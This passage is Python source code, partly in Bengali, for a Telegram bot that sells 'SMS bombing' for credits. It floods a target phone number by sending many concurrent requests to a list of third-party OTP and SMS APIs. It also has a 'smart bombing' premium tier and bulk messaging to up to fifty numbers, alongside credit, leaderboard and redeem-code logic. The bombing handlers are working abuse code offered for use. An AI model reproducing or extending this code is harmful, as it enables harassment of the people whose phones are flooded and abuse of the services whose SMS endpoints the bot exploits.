            is_prem = row[1] == 1 and not is_premium_expired(row[2])
            bonus = int(get_setting('premium_bonus' if is_prem else 'daily_bonus_amount', '10' if is_prem else '5'))
            cooldown = int(get_setting('daily_bonus_cooldown', '24'))
            if row[0]:
                try:
                    last = datetime.fromisoformat(row[0])
                    if (datetime.now() - last).total_seconds() < (cooldown * 3600):
                        remaining = (cooldown * 3600) - (datetime.now() - last).total_seconds()
                        hours = int(remaining // 3600)
                        minutes = int((remaining % 3600) // 60)
                        await update.message.reply_text(f"⏳ {hours}ঘ {minutes}মি বাকি", parse_mode="Markdown", reply_markup=get_main_keyboard())
                        return
                except:
                    pass
            await conn.execute(
                "UPDATE users SET balance = balance + ?, daily_bonus_date = ? WHERE user_id = ?",
                (bonus, datetime.now().isoformat(), user_id)
            )
            await conn.commit()
            await track_transaction(user_id, "bonus", bonus, "Daily bonus")
            await update.message.reply_text(f"🎉 +{bonus} ক্রেডিট!", parse_mode="Markdown", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("❌ ত্রুটি!", parse_mode="Markdown")
        return
    
    if message == "🏆 Leaderboard":
        conn = await get_db()
        cursor = await conn.execute("SELECT user_id, username, first_name, balance FROM users ORDER BY balance DESC LIMIT 10")
        users = await cursor.fetchall()
        if users:
            response = "🏆 **টপ ১০**\n━━━━━━━━━━━━━━━━━━━\n\n"
            medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
            for i, user in enumerate(users):
                name = user[2] or user[1] or f"User{user[0]}"
                response += f"{medals[i]} `{user[0]}` - {name} - 💰{user[3]}\n"
            await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("📊 কোনো ইউজার নেই!", parse_mode="Markdown", reply_markup=get_main_keyboard())
        return
    
    if message == "👑 Premium":
        conn = await get_db()
        cursor = await conn.execute("SELECT is_premium, premium_expiry, balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if row:
            is_prem = row[0] == 1 and not is_premium_expired(row[1])
            text = "👑 **প্রিমিয়াম**\n━━━━━━━━━━━━━━━━━━━\n\n"
            text += "🔹 স্মার্ট বোম্বিং\n"
            text += "🔹 এক্সট্রা বোনাস (+৩)\n"
            text += "🔹 কম SMS খরচ (০.৫)\n\n"
            if is_prem:
                text += "✅ **আপনি প্রিমিয়াম!**"
            else:
                price = get_setting('premium_price', '100')
                duration = get_setting('premium_duration', '30')
                text += f"💎 {price} ক্রেডিট / {duration} দিন\n"
                text += "📌 /buy_premium"
            await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("❌ পাওয়া যায়নি!", parse_mode="Markdown")
        return
    
    if message == "🎯 Smart Bombing":
        await update.message.reply_text("🎯 **Smart Bombing**\n\nটার্গেট নম্বর দিন:", parse_mode="Markdown")
        context.user_data['state'] = 'smart_bombing'
        return
    
    # ============================================================
    # 🔮 ইউটিলিটিস
    # ============================================================
    if message == "🔮 Utilities":
        await update.message.reply_text("🔮 **ইউটিলিটিস**", parse_mode="Markdown", reply_markup=get_utilities_keyboard())
        return
    
    # ============================================================
    # 🎯 ইউটিলিটি ফাংশন
    # ============================================================
    if message == "🌐 IP Info":
        result = await get_ip_info()
        await update.message.reply_text(result, parse_mode="Markdown", reply_markup=get_utilities_keyboard())
        return
    
    if message == "📮 ZIP Code":
        await update.message.reply_text("📮 **ZIP Code**\n\nFormat: `COUNTRY ZIP`\nExample: `us 33162`", parse_mode="Markdown")
        context.user_data['state'] = 'zip_info'
        return
    
    if message == "🎬 Movie":
        await update.message.reply_text("🎬 **Movie Info**\n\nমুভির নাম দিন:", parse_mode="Markdown")
        context.user_data['state'] = 'movie_info'
        return
    
    # ============================================================
    # 📝 স্টেট হ্যান্ডলিং
    # ============================================================
    if state == 'sms_number':
        number = message.strip()
        valid, msg = validate_phone(number)
        if not valid:
            await update.message.reply_text(f"❌ {msg}", parse_mode="Markdown")
            return
        context.user_data['sms_number'] = number
        context.user_data['state'] = 'sms_message'
        await update.message.reply_text(f"✅ `{number}`\n\n💬 মেসেজ দিন:", parse_mode="Markdown")
        return
    
    if state == 'sms_message':
        number = context.user_data.get('sms_number')
        msg = message.strip()
        if not number:
            await update.message.reply_text("❌ ত্রুটি!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        conn = await get_db()
        cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row or row[0] < 1:
            await update.message.reply_text("❌ পর্যাপ্ত ক্রেডিট নেই!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        await update.message.reply_text(f"⏳ পাঠানো হচ্ছে...", parse_mode="Markdown")
        success, response = await send_sms_api(number, msg)
        if success:
            conn = await get_db()
            await conn.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
            await conn.commit()
            await track_transaction(user_id, "spend", -1, f"SMS to {number}")
            await update.message.reply_text(f"✅ **সফল!**\n📱 `{number}`", parse_mode="Markdown", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text(f"❌ **ব্যর্থ!**\n{response}", parse_mode="Markdown", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    if state == 'bomber_number':
        number = message.strip()
        valid, msg = validate_phone(number)
        if not valid:
            await update.message.reply_text(f"❌ {msg}", parse_mode="Markdown")
            return
        context.user_data['bomber_number'] = number
        context.user_data['state'] = 'bomber_amount'
        max_amount = int(get_setting('max_bomber_amount', '50'))
        await update.message.reply_text(f"✅ `{number}`\n\n💥 পরিমাণ (১-{max_amount}):", parse_mode="Markdown")
        return
    
    if state == 'bomber_amount':
        if not BOMBING_ACTIVE:
            await update.message.reply_text("⛔ বোম্বিং বন্ধ!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        try:
            amount = int(message.strip())
            max_amount = int(get_setting('max_bomber_amount', '50'))
            if amount < 1 or amount > max_amount:
                await update.message.reply_text(f"❌ ১-{max_amount} এর মধ্যে দিন!", parse_mode="Markdown")
                return
        except:
            await update.message.reply_text("❌ সংখ্যা দিন!", parse_mode="Markdown")
            return
        number = context.user_data.get('bomber_number')
        if not number:
            await update.message.reply_text("❌ ত্রুটি!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        total_sms = len(BOMBER_APIS) * amount
        conn = await get_db()
        cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row or row[0] < total_sms:
            await update.message.reply_text(f"❌ প্রয়োজন: {total_sms} ক্রেডিট", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        
        async def call_api(api, phone):
            try:
                body = replace_phone(api.get('body', {}), phone)
                if api.get('method', 'POST').upper() == 'GET':
                    return await safe_api_call(api.get('url'), method='GET', params=body)
                else:
                    return await safe_api_call(api.get('url'), method='POST', data=body)
            except:
                return False, None, None
        
        msg = await update.message.reply_text(f"⏳ বোম্বিং শুরু!\n📱 {number}", parse_mode="Markdown")
        success_count = 0
        failed_count = 0
        
        for api in BOMBER_APIS:
            tasks = [call_api(api, number) for _ in range(amount)]
            results = await asyncio.gather(*tasks)
            
            for success, text, status in results:
                if not BOMBING_ACTIVE:
                    await msg.edit_text("⛔ বন্ধ!", parse_mode="Markdown")
                    context.user_data.clear()
                    return
                if success and text and check_success(text, status):
                    success_count += 1
                else:
                    failed_count += 1
                
                total_done = success_count + failed_count
                if total_done % 10 == 0:
                    try:
                        bar = progress_bar(total_done, total_sms)
                        await msg.edit_text(f"⏳ বোম্বিং...\n{bar}\n✅ {success_count} | ❌ {failed_count}", parse_mode="Markdown")
                    except:
                        pass
        
        conn = await get_db()
        await conn.execute(
            "UPDATE users SET balance = balance - ?, total_bombing = total_bombing + 1 WHERE user_id = ?",
            (total_sms, user_id)
        )
        await conn.commit()
        await track_transaction(user_id, "spend", -total_sms, f"Bombing to {number}")
        await msg.edit_text(
            f"✅ **সম্পূর্ণ!**\n━━━━━━━━━━━━━━━━━━━\n\n"
            f"📱 `{number}`\n"
            f"✅ সফল: {success_count}\n"
            f"❌ ব্যর্থ: {failed_count}\n"
            f"💰 খরচ: {total_sms}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        return
    
    if state == 'smart_bombing':
        if not BOMBING_ACTIVE:
            await update.message.reply_text("⛔ বোম্বিং বন্ধ!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        number = message.strip()
        valid, msg = validate_phone(number)
        if not valid:
            await update.message.reply_text(f"❌ {msg}", parse_mode="Markdown")
            return
        smart_apis = BOMBER_APIS[:20]
        amount_per_api = 5
        total_sms = len(smart_apis) * amount_per_api
        conn = await get_db()
        cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row or row[0] < total_sms:
            await update.message.reply_text(f"❌ প্রয়োজন: {total_sms} ক্রেডিট", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        
        async def call_api(api, phone):
            try:
                body = replace_phone(api.get('body', {}), phone)
                if api.get('method', 'POST').upper() == 'GET':
                    return await safe_api_call(api.get('url'), method='GET', params=body)
                else:
                    return await safe_api_call(api.get('url'), method='POST', data=body)
            except:
                return False, None, None
        
        msg = await update.message.reply_text(f"🧠 **স্মার্ট বোম্বিং শুরু!**\n📱 {number}", parse_mode="Markdown")
        success_count = 0
        failed_count = 0
        
        for api in smart_apis:
            tasks = [call_api(api, number) for _ in range(amount_per_api)]
            results = await asyncio.gather(*tasks)
            
            for success, text, status in results:
                if not BOMBING_ACTIVE:
                    await msg.edit_text("⛔ বন্ধ!", parse_mode="Markdown")
                    context.user_data.clear()
                    return
                if success and text and check_success(text, status):
                    success_count += 1
                else:
                    failed_count += 1
        
        cost = total_sms
        conn = await get_db()
        await conn.execute(
            "UPDATE users SET balance = balance - ? WHERE user_id = ?",
            (cost, user_id)
        )
        await conn.commit()
        await track_transaction(user_id, "spend", -cost, f"Smart bombing to {number}")
        await msg.edit_text(
            f"✅ **স্মার্ট বোম্বিং সম্পূর্ণ!**\n━━━━━━━━━━━━━━━━━━━\n\n"
            f"📱 `{number}`\n"
            f"📡 এপিআই: {len(smart_apis)}\n"
            f"💥 মোট: {total_sms}\n"
            f"✅ সফল: {success_count}\n"
            f"❌ ব্যর্থ: {failed_count}\n"
            f"💰 খরচ: {cost}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        context.user_data.clear()
        return
    
    if state == 'bulk_numbers':
        raw = message.strip()
        numbers = [num.strip() for num in re.split(r'[,\s\n]+', raw) if num.strip()]
        valid = []
        seen = set()
        for num in numbers:
            if num in seen:
                continue
            seen.add(num)
            if num.isdigit() and len(num) == 11:
                valid.append(num)
        if not valid:
            await update.message.reply_text("❌ কোনো ভ্যালিড নম্বর নেই!", parse_mode="Markdown")
            return
        max_bulk = int(get_setting('max_bulk_numbers', '50'))
        if len(valid) > max_bulk:
            await update.message.reply_text(f"❌ সর্বোচ্চ {max_bulk}টি!", parse_mode="Markdown")
            return
        context.user_data['bulk_numbers'] = valid
        context.user_data['state'] = 'bulk_message'
        await update.message.reply_text(f"✅ {len(valid)} টি নম্বর\n\n💬 মেসেজ দিন:", parse_mode="Markdown")
        return
    
    if state == 'bulk_message':
        numbers = context.user_data.get('bulk_numbers', [])
        msg = message.strip()
        if not numbers:
            await update.message.reply_text("❌ ত্রুটি!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        total = len(numbers)
        conn = await get_db()
        cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row or row[0] < total:
            await update.message.reply_text(f"❌ প্রয়োজন: {total} ক্রেডিট", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        status_msg = await update.message.reply_text(f"⏳ {total} টি নম্বরে পাঠানো হচ্ছে...", parse_mode="Markdown")
        success_list = []
        failed_list = []
        interval = float(get_setting('bulk_sms_interval', '0.05'))
        
        batch_size = 5
        for i in range(0, total, batch_size):
            batch = numbers[i:i+batch_size]
            tasks = []
            for num in batch:
                tasks.append(send_sms_api(num, msg))
            results = await asyncio.gather(*tasks)
            
            for idx, (success, response) in enumerate(results):
                num = batch[idx]
                if success:
                    success_list.append(num)
                else:
                    failed_list.append(num)
                
                conn = await get_db()
                await conn.execute("UPDATE users SET balance = balance - 1, total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
                await conn.commit()
            
            processed = min(i + batch_size, total)
            try:
                bar = progress_bar(processed, total)
                await status_msg.edit_text(f"⏳ পাঠানো...\n{bar}\n📊 {processed}/{total}", parse_mode="Markdown")
            except:
                pass
            await asyncio.sleep(interval)
        
        await track_transaction(user_id, "spend", -total, f"Bulk SMS to {len(success_list)} numbers")
        result = f"✅ **Bulk সম্পূর্ণ!**\n━━━━━━━━━━━━━━━━━━━\n\n"
        result += f"📤 মোট: {total}\n"
        result += f"✅ সফল: {len(success_list)}\n"
        result += f"❌ ব্যর্থ: {len(failed_list)}\n"
        result += f"💰 খরচ: {total}"
        if failed_list:
            result += f"\n\n❌ ব্যর্থ: {', '.join(failed_list[:5])}"
        await status_msg.edit_text(result, parse_mode="Markdown", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    if state == 'redeem_code':
        code = message.strip().upper()
        conn = await get_db()
        cursor = await conn.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code))
        if await cursor.fetchone():
            await update.message.reply_text("❌ আপনি ইতিমধ্যে এই কোড ব্যবহার করেছেন!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        cursor = await conn.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,))
        row = await cursor.fetchone()
        if not row or row[1] <= 0:
            await update.message.reply_text("❌ ভুল বা মেয়াদোত্তীর্ণ কোড!", parse_mode="Markdown", reply_markup=get_main_keyboard())
            context.user_data.clear()
            return
        amount = row[0]
        await conn.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await conn.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
        await conn.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
        await conn.commit()
        await track_transaction(user_id, "redeem", amount, f"Redeemed {code}")
        await update.message.reply_text(f"🎉 **রিডিম সফল!**\n✅ +{amount} ক্রেডিট", parse_mode="Markdown", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    if state == 'zip_info':
        parts = message.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Format: `COUNTRY ZIP`", parse_mode="Markdown")
            return
        result = await get_zip_info(parts[0], parts[1])
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    if state == 'movie_info':
        result = await get_movie_info(message)
        await update.message.reply_text(result, parse_mode="Markdown")
        context.user_data.pop('state', None)
        return
    
    # ============================================================
    # ডিফল্ট
    # ============================================================
    await update.message.reply_text("❌ **বাটন ব্যবহার করুন!**", parse_mode="Markdown")

# ============================================================
# 🚀 মেইন
# ============================================================

async def main():
    try:
        await init_db()
        
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("buy_premium", buy_premium))
        app.add_handler(CallbackQueryHandler(check_access_callback, pattern="check_access"))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        
        print("✅ Bot is RUNNING!")
        print(f"📡 APIs: {len(BOMBER_APIS)}")
        print(f"🔑 SMS API: {'✅' if SMS_API_URL and SMS_API_KEY else '❌'}")
        print(f"💣 Bombing: {'🟢' if BOMBING_ACTIVE else '🔴'}")
        print(f"⚡ Optimized: ✅ (Cache, Parallel, Batch)")
        print("=" * 60)
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Error: {e}")
        await asyncio.sleep(5)
        await main()
    finally:
        await close_db()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ Stopped!")
    except Exception as e:
        print(f"❌ Fatal: {e}")
        os.execv(sys.executable, [sys.executable] + sys.argv)
